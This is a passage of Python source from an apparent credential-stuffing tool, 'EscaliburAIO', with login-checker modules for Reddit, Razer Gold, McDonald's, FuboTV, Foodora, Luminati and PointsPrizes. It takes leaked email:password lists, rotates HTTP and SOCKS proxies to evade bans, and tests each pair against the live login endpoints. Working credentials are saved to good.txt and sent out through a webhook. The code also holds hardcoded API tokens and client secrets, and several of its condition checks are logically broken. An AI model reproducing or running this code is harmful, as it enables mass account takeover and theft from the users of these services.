            time.sleep(2)
            modules_names()
        module ="SkillShare"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=skillshare_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def reddit_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                

                url = "https://www.reddit.com/login/"


                headers = {
                    "rseor3":"true", 
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 OPR/62.0.3331.117", 
                    "Pragma":"no-cache", 
                    "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", 
                    "Upgrade-Insecure-Requests":"1", 
                    "Referer":"https://www.reddit.com/", 
                    "Accept-Language":"en-US,en;q=0.9", 
                    "Accept-Encoding":"gzip, deflate" 
                }
                f = sess.get(url, headers=headers)

                csrf = search(r'name=\"csrf_token\" value=\"(.*?)\"', str(f.text)).group(1)

                headers = {
                    "Content-Type":"application/x-www-form-urlencoded", 
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 OPR/62.0.3331.117", 
                    "Pragma":"no-cache", 
                    "Accept":"*/*", 
                    "Origin":"https://www.reddit.com", 
                    "Referer":"https://www.reddit.com/login/?dest=https%3A%2F%2Fwww.reddit.com%2F", 
                    "Accept-Language":"en-US,en;q=0.9", 
                    "Accept-Encoding":"gzip, deflate" 
                }

                content = f"csrf_token={csrf}&otp=&password={password}&dest=https://www.reddit.com&username={email}"

                r = sess.post("https://www.reddit.com/login", headers=headers, data=content)

                if "WRONG_PASSWORD" or "INCORRECT_USERNAME_PASSWORD" in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                elif "{\"dest\": \"https://www.reddit.com\"}" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                else:
                    threading.Thread(target=reddit_check, args=(emails, passwords, proxylist,)).start()

        except:
            errors+=1
            threading.Thread(target=reddit_check, args=(emails, passwords, proxylist,)).start()
    def reddit():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="Reddit"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=reddit_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def razergold_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                

                url = "https://razerid.razer.com/api/emily/7/login/get" 

                content = {"data":f"<COP><User><password>{password}</password><email>{email}</email></User><ServiceCode>0060</ServiceCode></COP>"}

                headers = {
                    "Content-Type":"application/json", 
                    "Host":"razerid.razer.com", 
                    "Accept":"application/json, text/plain, */*",
                    "Origin":"https://razerid.razer.com", 
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36", 
                    "Referer":"https://razerid.razer.com/" 
                }
                r = sess.post(url, headers=headers, json=content)
                if "Invalid Login, please check login ID and password" in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                elif "valid username and password" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                elif "Temporarily banned for consecutive failed login attempts" in r.text:
                    banned+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/banned.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                else:
                    threading.Thread(target=razergold_check, args=(emails, passwords, proxylist,)).start()

        except:
            errors+=1
            threading.Thread(target=razergold_check, args=(emails, passwords, proxylist,)).start()
    def razergold():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="RazerGold"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=razergold_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def pointsprizes_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                

                url = "https://www.pointsprizes.com/ref/2754165" 

                headers = {
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko", 
                    "Pragma":"no-cache", 
                    "Accept":"*/*"
                }
                f = sess.get(url, headers=headers)

                headers = {
                    "Content-Type":"application/x-www-form-urlencoded", 
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko", 
                    "Pragma":"no-cache", 
                    "Accept":"*/*", 
                    "scheme":"https", 
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3", 
                    "origin":"https://www.pointsprizes.com", 
                    "referer":"https://www.pointsprizes.com/", 
                    "upgrade-insecure-requests":"1",
                    "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
                }

                content = f"email={email}"

                r = sess.post("https://www.pointsprizes.com/account", headers=headers, data=content)
                if "<li><a href=\"https://www.file-up.org/?op=my_account\">My Account</a></li>" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                elif not "class=\"account-points-total\">0</strong>"  in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                elif "IP Address Already Used"  in r.text:
                    banned+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/banned.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                else:
                    threading.Thread(target=pointsprizes_check, args=(emails, passwords, proxylist,)).start()

        except:
            errors+=1
            threading.Thread(target=pointsprizes_check, args=(emails, passwords, proxylist,)).start()
    def pointsprizes():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="Points Prizes"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=pointsprizes_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def mcdonald_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                

                url = "https://us-prod.api.mcd.com/exp/v1/customer/login" 

                content = {"credentials":{"loginUsername":email,"password":password,"type":"email"}}

                headers = {
                    "Content-Type":"application/json", 
                    "X-acf-sensor-data":"1,a,gUURL96pPDJkF/hJgmIimcnNWlXPKKqaRGtKNtOb6H4nLDW98+NkRpa7nFDZUn6TRQ5iPw3vrozAk7/lbzifUWfrYYfWFx8H0F/g/zsdX0G9j8U7i/kkzcSukBcd0Ifh80iuM4DOC9HwULL/UNxFXP8z0mAALBV5hUc9C3J+hLw=,STjYTdb9XDEiX3lRaSQqcto4B3JrNSYGPg8Y/JS4x8mxOo6TTuIzvV4a4TssDuzCFPvuu7WVXrNV3aEeoq9DoZASBkXntZvvzIgKjzlV5sAxdPvHPfAJm6+hufmSI4e4fm4KrHRNt1BbrKE82AZI4/zqoCebiapQtcs+KYSG/yw=$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$0,0,0", 
                    "mcd-clientid":"8cGckR5wPgQnFBc9deVhJ2vT94WhMBRL", 
                    "authorization":"Bearer eyJhbGciOiJBMTI4S1ciLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwidHlwIjoiSldUIiwia2lkIjoiMjAxNi0wOS0xOSJ9.0mgQn-vZDm92JodtoUQhDgSngbkxIR_i940LYcLvkiXbiPPXpIJoXw.u9VneAhTVPmTHxN3A3wr1w.Zm3d7e4fJ6QKlp7TYuuIETnv0RcKTFiHYYzGSdVlWGCsUBxGlsGwPjSqTf5eiCJ77h9RlsD5PQR8jQbJ4lpNFRdAq7UaHgLXuHYlWFdpwq5Q0wNr4uxmU6c4q0tQNib69mDbl8Aa9yXC040Tv3MQrUzO-vtB-Pjh5UsuV-I35Z1WOhz_r9FZ9gUHHSJs82anMqh9CsR986qjBPIF6PeFeurZmSjnJqQOJneIst8gw-NTLikg1xGnIIpZeuUNqR6KDHRMe7zMtGPk2r2lF1hiessXhGpnp9iKFiIMlf6awhoJj7i7yizGDPaRAZ1FH_6C1EcNBV51Z4ZMozjeYvGD7rbcnniNMTDAbsDVet_WosRcoVTaAXorLj8TI_31h72oPwIVMtwWyypHJTv--ndUzGCjSwMIyQJ_SXiFiq6gbwd5OC9CChL2L3tZw4ryA45EnrorXKPWXv3ZJ-x9sftTGfV06SjAsQ-c5IWDMu6aZWhn8eRyOOmEs1lJvhcNQ_VjXJjCahS8wD30g-c1hYVnFK6whhsYqoFy7PpfAUFodCt1rrhYgeXDerM6Scvg3ptFN4FX9Azqx-wGfm5udKwdKGW9HnCX9kuTHg5zA7QXlKTkGaqPChnOoTv-9_7NJb8AA8BhraCR55q70BZ5x9pzfHqbNlW4uUsvGGDf7RT_R5sJwSXbsJBEARZsys0wGpDSAqP7xcQSUsmFS7HJg6j7olD-QVw2vplJ-7baZHMXgpgXPX1eRnFQx5cteNiNgTRjT1xeW71gyzFqbzpJiXX5UxcUqOY_tpULZI9SjXgNgq9hQ8m0KbuwFrlJw6PvNzYJ.d3LvuiS-U05qqdfT1H7QKg" ,
                    "cache-control":"true" ,
                    "accept-charset":"UTF-8", 
                    "user-agent":"MCDSDK/2.1.29 (Android; 22; en-US) GMA/6.4" ,
                    "accept-language":"en-US" ,
                    "mcd-sourceapp":"GMA" ,
                    "mcd-uuid":"93e204fc-986a-4a4a-9c11-43122d640692" ,
                    "mcd-marketid":"US" ,
                    "Content-Type":"application/json; charset=UTF-8" ,
                    "Content-Length":"95" ,
                    "Host":"us-prod.api.mcd.com" ,
                    "Connection":"Keep-Alive" ,
                    "Accept-Encoding":"gzip" ,
                    "X-NewRelic-ID":"UwUDUVNVGwIGVVRTDwgDVQ==" 
                }

                r = sess.post(url, json=content, headers=headers)
                if "Login is successful" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                elif "Login request has failed" in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                else:
                    threading.Thread(target=mcdonald_check, args=(emails, passwords, proxylist,)).start()

        except:
            errors+=1
            threading.Thread(target=mcdonald_check, args=(emails, passwords, proxylist,)).start()
    def mcdonald():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="MCDonald"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=mcdonald_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def luminati_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                

                url = "https://luminati.io/users/auth/basic/check_credentials"

                content = f"username={email}&password={password}" 

                headers = {
                    "Content-Type":"application/x-www-form-urlencoded", 
                    "Connection":"keep-alive", 
                    "Content-Length":"46", 
                    "Accept":"text/plain, */*; q=0.01", 
                    "Origin":"https://luminati.io", 
                    "X-Requested-With":"XMLHttpRequest", 
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.80 Safari/537.36", 
                    "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8", 
                    "Referer":"https://luminati.io/", 
                    "Accept-Encoding":"gzip, deflate, br", 
                    "Accept-Language":"en-US,en;q=0.9" 
                }

                r = sess.post(url, data=content, headers=headers)

                if "ok" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                elif "not_registered" or "unauthorized" in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                else:
                    threading.Thread(target=luminati_check, args=(emails, passwords, proxylist,)).start()

        except:
            errors+=1
            threading.Thread(target=luminati_check, args=(emails, passwords, proxylist,)).start()
    def luminati():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="Luminati"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=luminati_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def fubotv_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                

                url = "https://api.fubo.tv/signin"

                content = {"email":email,"password":password}

                headers = {
                    "Content-Type":"application/json", 
                    "accept-encoding":"gzip, deflate, br", 
                    "accept-language":"en-US,en;q=0.9,fr;q=0.8", 
                    "content-length":"57", 
                    "origin":"https://www.fubo.tv", 
                    "referer":"https://www.fubo.tv/signin", 
                    "sec-fetch-mode":"cors", 
                    "sec-fetch-site":"same-site", 
                    "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.", 
                    "x-client-version":"R20200131.2", 
                    "x-device-app":"web", 
                    "x-device-category":"desktop", 
                    "x-device-id":"QOiRWtf-qFFOrFBbPk", 
                    "x-device-model":"Windows NT 10.0 Chrome 79.0.3945.130", 
                    "x-device-platform":"desktop", 
                    "x-device-type":"desktop", 
                    "x-player-version":"1.25.0", 
                    "x-preferred-language":"en-US" 
                }
                r = sess.put(url, headers=headers, json=content)


                if "The username and/or password used for authentication are invalid" or "The username and/or password used for authentication are invalid" or "INVALID_USERNAME_PASSWORD" in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                elif "access_token" or "token_type\":\"Bearer" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                elif "You have been blocked," or "code\":\"BLOCKED" or "\"error\": { \"message\":\"You have been blocked, please contact support at " in r.text:
                    banned+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/banned.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                else:
                    threading.Thread(target=fubotv_check, args=(emails, passwords, proxylist,)).start()

        except:
            errors+=1
            threading.Thread(target=fubotv_check, args=(emails, passwords, proxylist,)).start()
    def fubotv():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="FuboTV"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=fubotv_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def foodora_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                

                url = "https://de.fd-api.com/api/v5/oauth2/token?language_id=4" 

                content = f"client_id=iphone&client_secret=2rwjhymk2iuc4cwsowg4cssokc888wo88g8k88480cswgc4wos&grant_type=password&language_id=4&password={password}&scope=API_CONSUMER%20API_GROUP_ORDERS&state=1hzp60537i&username={email}"

                headers = {
                    "Content-Type":"application/x-www-form-urlencoded", 
                    "Host":"de.fd-api.com" ,
                    "X-Caller-Country":"DE" ,
                    "Accept":"*/*" ,
                    "X-Caller-Version":"9576/4.25.0" ,
                    "X-Caller-Platform":"iOS" ,
                    "X-FP-API-KEY":"iphone" ,
                    "User-Agent":"foodora/9576" ,
                    "X-Caller-Name":"mobile" ,
                    "X-Caller-Environment":"APP_APPSTORE" 
                }

                r = sess.post(url, data=content, headers=headers)
                if "Invalid username and password" in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                elif "access_token" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                else:
                    threading.Thread(target=foodora_check, args=(emails, passwords, proxylist,)).start()

        except:
            errors+=1
            threading.Thread(target=foodora_check, args=(emails, passwords, proxylist,)).start()
    def foodora():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
